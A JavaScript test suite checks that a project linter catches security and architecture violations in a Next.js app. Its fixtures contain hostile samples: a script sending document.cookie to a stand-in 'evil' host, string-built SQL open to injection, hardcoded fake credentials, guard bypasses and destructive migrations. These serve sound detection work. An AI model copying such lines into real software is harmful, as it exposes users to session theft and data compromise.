// 独立レビュー（2026.11.2）で見つかった抜け道と誤検出の回帰テスト
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdirSync, symlinkSync, writeFileSync } from "node:fs";
import path from "node:path";
import { describe, test } from "node:test";
import { CHECK, PACKAGE_JSON, PROFILE, commitAll, gitInit, makeProject, read, releaseReady, remove, run, runText, templateFiles, write } from "./fixture.mjs";

const json = (v) => `${JSON.stringify(v, null, 2)}\n`;
const clone = (v) => JSON.parse(JSON.stringify(v));

function checkWith(mutate, args = [], { git = false, base = templateFiles, after } = {}) {
  const files = base();
  mutate(files);
  const dir = makeProject(files);
  try {
    if (git) gitInit(dir);
    if (after) after(dir);
    return run(dir, args);
  } finally {
    remove(dir);
  }
}

/** テンプレートをコミットしてから change を加え、--base で検査する */
function diffCheck(change, { setup, args = [] } = {}) {
  const files = templateFiles();
  if (setup) setup(files);
  const dir = makeProject(files);
  try {
    const base = gitInit(dir);
    change(dir);
    return run(dir, ["--base", base, ...args]);
  } finally {
    remove(dir);
  }
}

const of = (r, rule) => r.result.violations.filter((v) => v.rule === rule);
const files = (r, rule) => [...new Set(of(r, rule).map((v) => v.file))].sort();
const flagItems = (r, rule) => r.result.flags.filter((f) => f.rule === rule).flatMap((f) => f.items);
const clean = (r) => assert.equal(r.code, 0, JSON.stringify(r.result?.violations, null, 2));

const PAGE = (body) => `import { AccessDenied } from "@/components/access-denied";
import { getDb } from "@/db/client";
import { requirePermission } from "@/server/auth/guard";
import { listTodos } from "@/server/todos";
import { notFound, redirect } from "next/navigation";

export default async function Page() {
${body}
  const rows = await listTodos(await getDb());
  return <ul>{rows.map((r) => <li key={r.id}>{r.title}</li>)}</ul>;
}
`;

describe("重大1 SEC-11: ガードの結果を確かめる", () => {
  for (const [name, body] of [
    ["結果を捨てる", '  await requirePermission("todos.read");'],
    ["分割代入する", '  const { ok } = await requirePermission("todos.read");\n  if (!ok) return null;'],
    ["確かめるが抜けない", '  const access = await requirePermission("todos.read");\n  if (!access.ok) void AccessDenied;'],
    ["次の文で確かめない", '  const access = await requirePermission("todos.read");\n  const x = 1;\n  if (!access.ok) return null;\n  void x;'],
    ["別の変数を確かめる", '  const access = await requirePermission("todos.read");\n  const other = { ok: true };\n  if (!other.ok) return null;'],
  ]) {
    test(`${name}のは違反`, () => {
      const r = checkWith((f) => (f["src/app/(app)/x/page.tsx"] = PAGE(body)));
      assert.deepEqual(files(r, "SEC-11"), ["src/app/(app)/x/page.tsx"], JSON.stringify(r.result.violations, null, 2));
    });
  }
  test("return・redirect・notFound・throw で抜ける形は可", () => {
    for (const body of [
      '  const access = await requirePermission("todos.read");\n  if (!access.ok) return <AccessDenied message={access.message} />;',
      '  const access = await requirePermission("todos.read");\n  if (!access.ok) redirect("/login");',
      '  const a = await requirePermission("todos.read");\n  if (!a.ok) {\n    notFound();\n  }',
      '  const a = await requirePermission("todos.read");\n  if (a.ok === false) throw new Error("forbidden");',
    ]) {
      clean(checkWith((f) => (f["src/app/(app)/x/page.tsx"] = PAGE(body))));
    }
  });
});

describe("重大2 検査の範囲", () => {
  test("src の外の \"use server\"・DB・sql.raw・process.env も検査する", () => {
    const r = checkWith((f) => {
      f["actions/todos.ts"] = `"use server";
import { getDb } from "../src/db/client";
import { todos } from "../src/db/schema";
import { sql } from "drizzle-orm";

export async function deleteAll() {
  const db = await getDb();
  await db.delete(todos);
}
export async function search(q: string) {
  const db = await getDb();
  return db.execute(sql.raw(\`SELECT * FROM todos WHERE title LIKE '%\${q}%'\`));
}
export const key = process.env.SESSION_SECRET;
`;
    });
    for (const rule of ["ARCH-02", "ARCH-03", "ARCH-05", "SEC-04"]) assert.deepEqual(files(r, rule), ["actions/todos.ts"], rule);
  });

  test("ルートの app/（src/app と並ぶもの）と pages/ は違反", () => {
    const r = checkWith((f) => {
      f["app/admin/page.tsx"] = "export default function A() {\n  return null;\n}\n";
      f["pages/api/x.ts"] = "export default function handler() {}\n";
    });
    assert.deepEqual(files(r, "SEC-11"), ["app/admin/page.tsx", "pages/api/x.ts"]);
  });

  test("src・app の中のシンボリックリンクは違反（リンクはたどらない）。--base では SEC-12", () => {
    const linkIt = (dir) => {
      write(dir, "features/admin/page.tsx", 'import { todos } from "@/db/schema";\nexport default function P() {\n  return <p>{String(todos)}</p>;\n}\n');
      symlinkSync(path.join("..", "..", "..", "features", "admin"), path.join(dir, "src", "app", "(app)", "admin"));
    };
    const r = checkWith(() => {}, [], { after: linkIt });
    assert.deepEqual(files(r, "ARCH-11"), ["src/app/(app)/admin"]);
    const d = diffCheck(linkIt);
    assert.ok(flagItems(d, "SEC-12").includes("src/app/(app)/admin（シンボリックリンク）"));
  });

  test("tests・e2e という名前の画面や API は、アプリのコードとして検査する", () => {
    const r = checkWith((f) => {
      f["src/app/(app)/tests/page.tsx"] = 'import { getDb } from "@/db/client";\nimport { todos } from "@/db/schema";\nexport default async function Page() {\n  const db = await getDb();\n  return <p>{(await db.select().from(todos)).length}</p>;\n}\n';
      f["src/app/api/e2e/x/route.ts"] = 'import { getDb } from "@/db/client";\nexport async function GET() {\n  return Response.json(String(getDb));\n}\n';
    });
    assert.deepEqual(files(r, "SEC-11"), ["src/app/(app)/tests/page.tsx", "src/app/api/e2e/x/route.ts"]);
    assert.ok(files(r, "ARCH-02").includes("src/app/(app)/tests/page.tsx"));
  });

  test("NUL を含むコードと 5MB を超えるコードは、読み飛ばさずに違反", () => {
    const r = checkWith((f) => {
      f["src/app/(app)/nul/page.tsx"] = '// \u0000 generated\nimport { todos } from "@/db/schema";\nexport default function P() {\n  return null;\n}\n';
      f["src/app/(app)/big/page.tsx"] = `export default function P() {\n  return null;\n}\n${"// x\n".repeat(1_040_000)}`;
    });
    assert.deepEqual(files(r, "ARCH-11"), ["src/app/(app)/big/page.tsx", "src/app/(app)/nul/page.tsx"]);
    assert.ok(of(r, "ARCH-11").some((v) => /NUL/.test(v.message)));
    assert.ok(of(r, "ARCH-11").some((v) => /5\.\dMB で上限/.test(v.message)));
  });
});

describe("重大3 export の抜け", () => {
  test('"use server" の export const a = defineAction(…), b = … の b も検査する', () => {
    const r = checkWith((f) => {
      f["src/app/(app)/todos/actions.ts"] = f["src/app/(app)/todos/actions.ts"].replace(
        /\n\}\);\n\nexport const completeTodoAction/,
        "\n}), wipe = async (title: string) => {\n  await createTodo(null as never, { title });\n};\n\nexport const completeTodoAction",
      );
    });
    assert.ok(of(r, "ARCH-03").some((v) => /「wipe」/.test(v.message)), JSON.stringify(r.result.violations));
  });

  test("route のメソッドの分割代入と let の export は違反。Better Auth の toNextJsHandler だけは可", () => {
    const r = checkWith((f) => {
      f["src/app/api/a2/route.ts"] = 'import { requireUser } from "@/server/auth/guard";\nconst handlers = { GET: async () => Response.json(await requireUser()) };\nexport const { GET } = handlers;\n';
      f["src/app/api/a9/route.ts"] = 'import { requireUser } from "@/server/auth/guard";\nexport let GET: () => Promise<Response>;\nGET = async () => Response.json(await requireUser());\n';
    });
    assert.deepEqual(files(r, "SEC-11"), ["src/app/api/a2/route.ts", "src/app/api/a9/route.ts"]);
    clean(
      checkWith((f) => {
        f["src/app/api/auth/[...all]/route.ts"] = 'import { toNextJsHandler } from "better-auth/next-js";\nimport { auth } from "@/server/auth/auth";\n\nexport const { GET, POST } = toNextJsHandler(auth);\n';
        f["src/server/auth/auth.ts"] = "export const auth = {};\n";
      }),
    );
  });
});

describe("中4 ARCH-02 DB アクセス", () => {
  test("括弧で包んだ getDb()・引数の Db・別名・ローカル関数に渡すのは違反", () => {
    const r = checkWith((f) => {
      f["src/app/(app)/a5/page.tsx"] = `import { getDb } from "@/db/client";
import type { Db } from "@/db/client";
import { requirePermission } from "@/server/auth/guard";

async function load(conn: Db) {
  return conn.query.todos.findMany();
}
export default async function Page() {
  const access = await requirePermission("todos.read");
  if (!access.ok) return null;
  const c = (await getDb());
  const rows = await load(await getDb());
  return <p>{String(c)}{rows.length}</p>;
}
`;
      f["src/app/(app)/a6/page.tsx"] = `import { getDb as g } from "@/db/client";
import { allowAnonymous } from "@/server/auth/guard";
import { listTodos } from "@/server/todos";
export default async function Page() {
  allowAnonymous("公開の一覧");
  return <p>{(await listTodos(await g())).length}</p>;
}
`;
    });
    const msgs = of(r, "ARCH-02").map((v) => `${v.file}:${v.line}`);
    for (const at of ["src/app/(app)/a5/page.tsx:2", "src/app/(app)/a5/page.tsx:6", "src/app/(app)/a5/page.tsx:11", "src/app/(app)/a5/page.tsx:12", "src/app/(app)/a6/page.tsx:1"]) {
      assert.ok(msgs.includes(at), `${at}: ${msgs.join(", ")}`);
    }
  });

  test("DB を読み込まないファイルの db.transaction（IndexedDB）は対象外", () => {
    clean(
      checkWith((f) => {
        f["src/app/(app)/todos/components/draft.tsx"] = '"use client";\nimport { useEffect } from "react";\nexport function Draft() {\n  useEffect(() => {\n    const req = indexedDB.open("drafts", 1);\n    req.onsuccess = () => {\n      const db = req.result;\n      db.transaction("drafts", "readwrite").objectStore("drafts").put({ id: 1 });\n    };\n  }, []);\n  return null;\n}\n';
      }),
    );
  });
});

describe("中5 SEC-04 文字列の SQL（src/server も）", () => {
  test("文字列の変数・sql[\"raw\"]・分割代入の raw・再公開した別名の raw は違反", () => {
    const r = checkWith((f) => {
      f["src/server/sql-helpers.ts"] = 'export { sql as q } from "drizzle-orm";\n';
      f["src/server/report.ts"] = `import type { Db } from "@/db/client";
import { sql } from "drizzle-orm";
import { q } from "@/server/sql-helpers";

export async function search(db: Db, title: string) {
  const stmt = \`SELECT * FROM todos WHERE title = '\${title}'\`;
  const a = await db.execute(stmt);
  const raw = sql["raw"];
  const { raw: r2 } = sql;
  const b = await db.execute(q.raw(stmt));
  const c = await db.$client.query(title);
  return [a, raw, r2, b, c];
}
`;
    });
    assert.deepEqual(
      of(r, "SEC-04").map((v) => v.line).sort((a, b) => a - b),
      [7, 8, 9, 10, 11],
    );
  });

  test("正規表現の exec と sql`…` のタグ付きテンプレートは可", () => {
    clean(
      checkWith((f) => {
        f["src/server/parse.ts"] = 'import type { Db } from "@/db/client";\nimport { sql } from "drizzle-orm";\nconst ID = /^(\\d+)$/;\nexport async function f(db: Db, s: string) {\n  const m = /^(\\d+)$/.exec(s) ?? ID.exec(s);\n  const q = sql`select ${s}`;\n  return [m, await db.execute(q)];\n}\n';
      }),
    );
  });
});

describe("中6 SEC-05 秘密情報", () => {
  const stripe = ["sk", "_live_", "51HxYzAbCdEfGhIjKlMnOpQrStUv"].join("");
  test("camelCase の名前・項目の pass・Stripe のキー・src の外の設定ファイルは違反", () => {
    const r = checkWith((f) => {
      f["src/server/secrets.ts"] = `export const dbPassword = "Pr0dP@ssw0rd!2026";\nexport const stripeKey = "${stripe}";\nexport const smtpAuth = { user: "app", pass: "MailP@ss2026xyz" };\n`;
      f["drizzle.config.prod.ts"] = 'export default {\n  dbCredentials: { host: "prod-db.corp.internal", user: "app", password: "Pr0dDbP@ss2026", database: "app" },\n};\n';
    });
    assert.deepEqual(
      of(r, "SEC-05").map((v) => `${v.file}:${v.line}`).sort(),
      ["drizzle.config.prod.ts:2", "src/server/secrets.ts:1", "src/server/secrets.ts:2", "src/server/secrets.ts:3"],
    );
  });
  test("Cookie の名前・環境変数の名前・文言は対象外", () => {
    clean(
      checkWith((f) => {
        f["src/server/names.ts"] = 'export const E2E_AUTH_TOKEN_COOKIE = "devkit-e2e-token";\nexport const tokenEnv = "SESSION_TOKEN";\nexport const passwordLabel = "パスワード（8文字以上）";\nexport const secretHeader = "x-devkit-secret";\n';
      }),
    );
  });
});

describe("中7 ESC-02 外部接続", () => {
  test("行頭のコメントの後の fetch・$schema と同じ行・public/ の JS・globalThis.fetch・child_process・window.WebSocket", () => {
    const r = diffCheck((dir) => {
      write(dir, "src/server/feat/a.ts", '/* report usage */ export const ping = () => fetch("https://telemetry.evil-analytics.io/collect", { method: "POST" });\n');
      write(dir, "src/server/feat/b.ts", 'import { execFile } from "node:child_process";\nconst f = globalThis.fetch;\nexport const send = (u: string) => f(u);\nexport const run = (u: string) => execFile("curl", [u]);\n');
      write(dir, "src/server/feat/c.ts", 'const cfg = { "$schema": "x", endpoint: "https://api.unregistered-partner.io/v1" };\nexport const c = cfg;\n');
      write(dir, "public/tracker.js", 'fetch("https://tracker.evil-analytics.io/p?c=" + document.cookie);\n');
      write(dir, "src/app/(app)/chat/components/live.tsx", '"use client";\nexport function Live({ url }: { url: string }) {\n  const ws = new window.WebSocket(url);\n  void ws;\n  return null;\n}\n');
    });
    const items = flagItems(r, "ESC-02").join("\n");
    for (const s of [
      "telemetry.evil-analytics.io（src/server/feat/a.ts:1）",
      "api.unregistered-partner.io（src/server/feat/c.ts:1）",
      "tracker.evil-analytics.io（public/tracker.js:1）",
      "src/server/feat/a.ts:1（fetch）",
      "src/server/feat/b.ts:2（fetch）",
      "src/server/feat/b.ts:1（node:child_process）",
      "public/tracker.js:1（fetch）",
      "src/app/(app)/chat/components/live.tsx:3（new window.WebSocket）",
    ]) {
      assert.ok(items.includes(s), `${s}\n${items}`);
    }
  });
  test(".env.example のクオートなしのホストも見る", () => {
    const r = diffCheck((dir) => write(dir, ".env.example", `${read(dir, ".env.example")}SMTP_HOST=smtp.corp-mail.co.jp\n`));
    assert.deepEqual(flagItems(r, "ESC-02"), ["smtp.corp-mail.co.jp（.env.example:3）"]);
  });
});

describe("名前に日本語・空白・引用符・改行を含むファイル（--base）", () => {
  test("差分の中のファイル名をそのまま扱う", () => {
    const dir = makeProject();
    try {
      const base = gitInit(dir);
      write(dir, "src/server/日本 語/取得.ts", 'export const a = () => fetch("https://jp.evil.io/x");\n');
      write(dir, 'src/server/we"ird\nname.ts', 'export const b = () => fetch("https://nl.evil.io/x");\n');
      const head = commitAll(dir, "add");
      const r = run(dir, ["--base", base, "--head", head]);
      const items = flagItems(r, "ESC-02");
      assert.ok(items.includes("jp.evil.io（src/server/日本 語/取得.ts:1）"), items.join("\n"));
      assert.ok(items.includes('nl.evil.io（src/server/we"ird\nname.ts:1）'), items.join("\n"));
    } finally {
      remove(dir);
    }
  });
});

describe("中8 SEC-12 安全の中心", () => {
  test("security-headers.ts・proxy.ts・tsconfig.json の変更", () => {
    const r = diffCheck(
      (dir) => {
        write(dir, "src/lib/security-headers.ts", 'export const CSP = "connect-src *";\n');
        write(dir, "src/proxy.ts", "export function proxy() {\n  return null;\n}\n// changed\n");
        write(dir, "tsconfig.json", `${read(dir, "tsconfig.json")}\n`);
      },
      {
        setup: (f) => {
          f["src/lib/security-headers.ts"] = "export const CSP = \"connect-src 'self'\";\n";
          f["src/proxy.ts"] = "export function proxy() {\n  return null;\n}\n";
          f["tsconfig.json"] = json({ compilerOptions: { paths: { "@/*": ["./src/*"] } } });
        },
      },
    );
    const items = flagItems(r, "SEC-12");
    for (const f of ["src/lib/security-headers.ts", "src/proxy.ts", "tsconfig.json"]) assert.ok(items.includes(f), f);
  });

  test("tsconfig の paths に別の対応を足すと違反（ARCH-11）", () => {
    const r = checkWith((f) => (f["tsconfig.json"] = json({ compilerOptions: { paths: { "@/server/action": ["./src/lib/noop.ts"], "@/*": ["./src/*"] } } })));
    assert.deepEqual(files(r, "ARCH-11"), ["tsconfig.json"]);
  });

  test("権限表が読み込むファイル（role-groups.ts）の変更は ESC-03 と SEC-12。can() の変更は SEC-12", () => {
    const setup = (f) => {
      f["src/lib/role-groups.ts"] = 'export const EDITORS = ["admin", "member", "viewer"] as const;\n';
      f["src/server/auth/permissions.ts"] = `import { EDITORS } from "@/lib/role-groups";\n${f["src/server/auth/permissions.ts"].replace('"todos.create": ["admin", "member"],', '"todos.create": EDITORS,')}`;
    };
    const groups = diffCheck((dir) => write(dir, "src/lib/role-groups.ts", 'export const EDITORS = ["admin", "member"] as const;\n'), { setup });
    assert.deepEqual(flagItems(groups, "ESC-03"), ["src/lib/role-groups.ts"]);
    assert.ok(flagItems(groups, "SEC-12").includes("src/lib/role-groups.ts"));
    const canChanged = diffCheck((dir) =>
      write(dir, "src/server/auth/permissions.ts", read(dir, "src/server/auth/permissions.ts").replace("return (PERMISSIONS[permission] as readonly Role[]).includes(role);", "return true;")),
    );
    assert.ok(flagItems(canChanged, "SEC-12").includes("src/server/auth/permissions.ts（can() の実装）"));
    assert.deepEqual(flagItems(canChanged, "ESC-03"), ["src/server/auth/permissions.ts"]);
  });
});

describe("中9 TECH-01・TECH-02・DEPS 依存", () => {
  const depSetup = (f) => {
    const pkg = clone(PACKAGE_JSON);
    pkg.pnpm = {
      onlyBuiltDependencies: ["esbuild", "evil-postinstall"],
      patchedDependencies: { "next@16.4.5": "patches/next@16.4.5.patch" },
      packageExtensions: { "zod@4.6.7": { dependencies: { axios: "^1.7.0" } } },
    };
    f["package.json"] = json(pkg);
    f["pnpm-workspace.yaml"] = "packages:\n  - packages/*\noverrides:\n  zod: npm:zod-fork@^4\ncatalog:\n  lodash: ^4.17.21\n";
    f["packages/util/package.json"] = json({ name: "util", version: "0.0.0", dependencies: { axios: "1.7.0", lodash: "catalog:" } });
    f[".pnpmfile.cjs"] = "module.exports = { hooks: {} };\n";
  };
  test("ワークスペース・packageExtensions・patchedDependencies・onlyBuiltDependencies・.pnpmfile を検査する", () => {
    const r = checkWith(depSetup);
    const t1 = of(r, "TECH-01").map((v) => `${v.file}|${v.message}`).join("\n");
    for (const s of ["packages/util/package.json|許可リストにない依存「axios」", "package.json|許可リストにない依存「axios」（pnpm.packageExtensions", "pnpm-workspace.yaml|許可リストにない依存「lodash」", "evil-postinstall"]) {
      assert.ok(t1.includes(s), `${s}\n${t1}`);
    }
    const t2 = of(r, "TECH-02").map((v) => `${v.file}|${v.message}`).join("\n");
    for (const s of ["pnpm-workspace.yaml|overrides の「zod」", "packages/util/package.json|「lodash」（dependencies）のバージョン「^4.17.21」", "patchedDependencies", ".pnpmfile.cjs"]) {
      assert.ok(t2.includes(s), `${s}\n${t2}`);
    }
  });
  test("--base で依存の追加と版の変更をフラグ（DEPS・技術ゲート）にする", () => {
    const r = diffCheck((dir) => {
      const pkg = JSON.parse(read(dir, "package.json"));
      pkg.dependencies.zod = "4.6.8";
      pkg.dependencies["date-fns"] = "4.1.0";
      write(dir, "package.json", json(pkg));
    });
    const flag = r.result.flags.find((f) => f.rule === "DEPS");
    assert.equal(flag?.role, "technical");
    assert.deepEqual(flag.items.sort(), ["package.json: dependencies.date-fns を追加（4.1.0）", "package.json: dependencies.zod の版を変更（4.6.7 → 4.6.8）"]);
  });
});

describe("中10 OPS-04 破壊的なマイグレーション", () => {
  test("ADD と並べた DROP・COLUMN を省いた TYPE・EXECUTE・DROP FUNCTION / POLICY・文字列の中の -- の後の DROP", () => {
    const r = checkWith((f) => {
      f["docs/profile.json"] = json({ ...PROFILE, released: true, releasedMigration: "0000_init" });
      f["drizzle/0001_x.sql"] = [
        'ALTER TABLE "todos" ADD COLUMN "note" text, DROP "done";',
        'ALTER TABLE "todos" ALTER "title" TYPE varchar(10);',
        "DO $$ BEGIN EXECUTE 'DROP TABLE audit_logs'; END $$;",
        "DO $$ BEGIN EXECUTE format('DROP TABLE %I', 'x'); END $$;",
        "DROP FUNCTION IF EXISTS f();",
        'ALTER TABLE "todos" ADD COLUMN "truncate" text;',
        'ALTER TABLE "todos" ALTER COLUMN "title" DROP NOT NULL;',
        "CREATE TRIGGER t AFTER INSERT ON todos FOR EACH ROW EXECUTE FUNCTION f();",
        `UPDATE "todos" SET "title" = '--' WHERE "id" = 0; DROP POLICY p ON todos;`,
      ].join("\n");
    });
    assert.deepEqual(
      of(r, "OPS-04").map((v) => v.line),
      [1, 2, 3, 4, 5, 9],
    );
  });
});

describe("中11 大きな出力", () => {
  test("1000 件の違反でも --json が最後まで出る（パイプで切れない）", () => {
    const dir = makeProject();
    try {
      writeFileSync(path.join(dir, "src", "lib", "many.ts"), `${Array.from({ length: 1000 }, (_, i) => `export const v${i} = process.env.X${i};`).join("\n")}\n`);
      const r = spawnSync(process.execPath, [CHECK, "--json"], { cwd: dir, encoding: "utf8", maxBuffer: 64 * 1024 * 1024 });
      const result = JSON.parse(r.stdout);
      assert.equal(r.status, 1);
      assert.equal(result.violations.filter((v) => v.rule === "ARCH-05").length, 1000);
    } finally {
      remove(dir);
    }
  });
});

describe("中12 接続文字列の誤検出", () => {
  test("手順書の大文字のプレースホルダ・compose の開発用 DB サービスは可。本物らしい値は違反", () => {
    clean(
      checkWith((f) => {
        f["docs/runbook.md"] += "\n## 参考\n\n本番の接続文字列の形式: `DATABASE_URL=postgres://USER:PASSWORD@HOST:5432/DBNAME`\n";
        f["compose.yaml"] = f["compose.yaml"].replace("services:\n", "services:\n  app:\n    build: .\n    environment:\n      DATABASE_URL: postgres://app:app@db:5432/app\n");
      }),
    );
    const real = ["postgres://app:", "S3cr3tPw", "@db.prod.corp.internal:5432/app"].join("");
    const r = checkWith((f) => (f["docs/runbook.md"] += `\n本番: ${real}\n`));
    assert.deepEqual(files(r, "SEC-05"), ["docs/runbook.md"]);
  });
});

describe("中13 SEC-08 個人情報", () => {
  test("番号付きの列・sei / mei・jsonb の contact・pgTable( の後の改行", () => {
    const r = diffCheck((dir) => {
      write(
        dir,
        "src/db/schema.ts",
        `${read(dir, "src/db/schema.ts")}
export const customers = pgTable(
  "customers",
  {
    id: serial("id").primaryKey(),
    address1: text("address1"),
    tel1: text("tel1"),
    sei: text("sei"),
    mei: text("mei"),
    contact: jsonb("contact").$type<{ email: string }>(),
    shohinMei: text("shohin_mei"),
  },
);
`,
      );
    });
    const items = flagItems(r, "SEC-08").map((i) => i.split("（")[0]);
    assert.deepEqual(items.sort(), ["customers.address1", "customers.contact", "customers.mei", "customers.sei", "customers.tel1"]);
  });
});

describe("中14 SEC-11 レイアウトとメタデータ", () => {
  test("DB に触れるレイアウト・generateMetadata・opengraph-image・sitemap は入口の確認が要る", () => {
    const r = checkWith((f) => {
      const body = 'import { getDb } from "@/db/client";\nimport { listTodos } from "@/server/todos";\n';
      f["src/app/(app)/a6/layout.tsx"] = `${body}export default async function L({ children }: { children: React.ReactNode }) {\n  const rows = await listTodos(await getDb());\n  return <div>{rows.length}{children}</div>;\n}\n`;
      f["src/app/(app)/a6/opengraph-image.tsx"] = `${body}export default async function Image() {\n  return new Response(String((await listTodos(await getDb())).length));\n}\n`;
      f["src/app/sitemap.ts"] = `${body}export default async function sitemap() {\n  return (await listTodos(await getDb())).map((r) => ({ url: \`/todos/\${r.id}\` }));\n}\n`;
      f["src/app/(app)/todos/page.tsx"] += `\nexport async function generateMetadata() {\n  return { title: String((await listTodos(await getDb())).length) };\n}\n`;
    });
    assert.deepEqual(files(r, "SEC-11"), ["src/app/(app)/a6/layout.tsx", "src/app/(app)/a6/opengraph-image.tsx", "src/app/(app)/todos/page.tsx", "src/app/sitemap.ts"]);
  });
  test("DB に触れないもの、ガードか allowAnonymous のあるものは可", () => {
    clean(
      checkWith((f) => {
        f["src/app/(app)/a7/layout.tsx"] = "export default function L({ children }: { children: React.ReactNode }) {\n  return <div>{children}</div>;\n}\n";
        f["src/app/robots.ts"] = 'export default function robots() {\n  return { rules: { userAgent: "*", disallow: "/" } };\n}\n';
        f["src/app/sitemap.ts"] =
          'import { getDb } from "@/db/client";\nimport { allowAnonymous } from "@/server/auth/guard";\nimport { listTodos } from "@/server/todos";\nexport default async function sitemap() {\n  allowAnonymous("公開する一覧だけを載せる");\n  return (await listTodos(await getDb())).map((r) => ({ url: `/todos/${r.id}` }));\n}\n';
      }),
    );
  });
});

describe("軽微", () => {
  test("TECH-03: ARG の既定値を解決する（解決できなければ違反）", () => {
    clean(checkWith((f) => (f.Dockerfile = f.Dockerfile.replace("FROM node:24-alpine AS base", "ARG NODE_VERSION=24\nFROM node:${NODE_VERSION}-alpine AS base"))));
    const r = checkWith((f) => (f.Dockerfile = f.Dockerfile.replace("FROM node:24-alpine AS base", "ARG NODE_VERSION\nFROM node:${NODE_VERSION}-alpine AS base")));
    assert.deepEqual(files(r, "ARCH-11").concat(files(r, "TECH-03")), ["Dockerfile"]);
  });

  test("ARCH-05: クライアントの NODE_ENV と NEXT_PUBLIC_* は可。サーバーの NODE_ENV と process の別名は違反", () => {
    clean(
      checkWith((f) => {
        f["src/components/flag.tsx"] = '"use client";\nexport function Flag() {\n  return <p>{process.env.NODE_ENV === "development" ? process.env.NEXT_PUBLIC_LABEL : ""}</p>;\n}\n';
      }),
    );
    const r = checkWith((f) => {
      f["src/server/mode.ts"] = 'import * as proc from "node:process";\nimport p2 from "process";\nexport const dev = process.env.NODE_ENV;\nexport const a = proc.env.A;\nexport const b = p2.env.B;\nconst g = globalThis as unknown as { process: { env: Record<string, string> } };\nexport const c = g.process.env.C;\n';
    });
    assert.deepEqual(
      of(r, "ARCH-05").map((v) => v.line),
      [3, 4, 5, 7],
    );
  });

  test("SEC-09: ENV AUTH_MODE dev（旧い書き方）も検出し、行番号がずれない", () => {
    const r = checkWith(
      (f) => (f.Dockerfile = f.Dockerfile.replace("ENV NODE_ENV=production", "# 開発用の認証についての長い説明のコメント（AUTH_MODE）\nENV NODE_ENV=production\nENV AUTH_MODE dev")),
      ["--release"],
      { git: true, base: () => releaseReady(templateFiles()) },
    );
    const v = of(r, "SEC-09");
    assert.equal(v.length, 1);
    const lines = releaseReady(templateFiles())
      .Dockerfile.replace("ENV NODE_ENV=production", "# 開発用の認証についての長い説明のコメント（AUTH_MODE）\nENV NODE_ENV=production\nENV AUTH_MODE dev")
      .split("\n");
    assert.equal(lines[v[0].line - 1], "ENV AUTH_MODE dev");
  });

  test("findRoot は git のルートより上に上らない（標準がなければ終了コード 2）", () => {
    const outer = makeProject();
    try {
      const inner = path.join(outer, "inner");
      mkdirSync(path.join(inner, "src"), { recursive: true });
      gitInit(inner);
      const r = runText(inner, [], { cwd: path.join(inner, "src") });
      assert.equal(r.code, 2);
    } finally {
      remove(outer);
    }
  });

  test("--base のときの「自動検査 N 項目」はフラグを数えない", () => {
    const dir = makeProject();
    try {
      gitInit(dir);
      const plain = runText(dir).stdout.match(/自動検査 (\d+) 項目/)[1];
      const withBase = runText(dir, ["--base", "HEAD"]).stdout.match(/自動検査 (\d+) 項目/)[1];
      assert.equal(withBase, plain);
      commitAll(dir);
    } finally {
      remove(dir);
    }
  });

  test("4.8MB のコードでも数秒で終わる", () => {
    const rows = Array.from({ length: 120_000 }, (_, i) => `  ["${String(i).padStart(7, "0")}", "東京都千代田区"],`);
    const r = (() => {
      const dir = makeProject();
      try {
        write(dir, "src/lib/data/postal.ts", `export const POSTAL: [string, string][] = [\n${rows.join("\n")}\n];\n`);
        const start = Date.now();
        const out = run(dir);
        return { ...out, ms: Date.now() - start };
      } finally {
        remove(dir);
      }
    })();
    assert.equal(r.code, 0, JSON.stringify(r.result?.violations));
    assert.ok(rows.join("\n").length > 1_500_000 && Buffer.byteLength(rows.join("\n")) > 4_500_000);
    assert.ok(r.ms < 5000, `${r.ms}ms`);
  });
});
